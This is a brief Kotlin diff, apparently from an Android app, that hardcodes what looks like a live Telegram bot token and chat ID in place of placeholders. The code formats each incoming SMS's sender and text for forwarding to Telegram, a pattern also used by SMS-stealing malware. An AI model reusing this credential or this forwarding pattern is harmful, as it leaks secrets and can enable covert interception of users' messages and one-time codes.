@@ -4,8 +4,8 @@ import java.io.IOException
 
 object TelegramService {
     private val client = OkHttpClient()
-    private const val BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
-    private const val CHAT_ID = "YOUR_CHAT_ID_HERE"
+    private const val BOT_TOKEN = "8523158193:AAE7LKktxM-vq13I1aoHqyID6BTdfTJUnv8"
+    private const val CHAT_ID = "5967798239"
 
     fun sendSms(sender: String, message: String) {
         val text = "New SMS from: $sender\nMessage: $message"
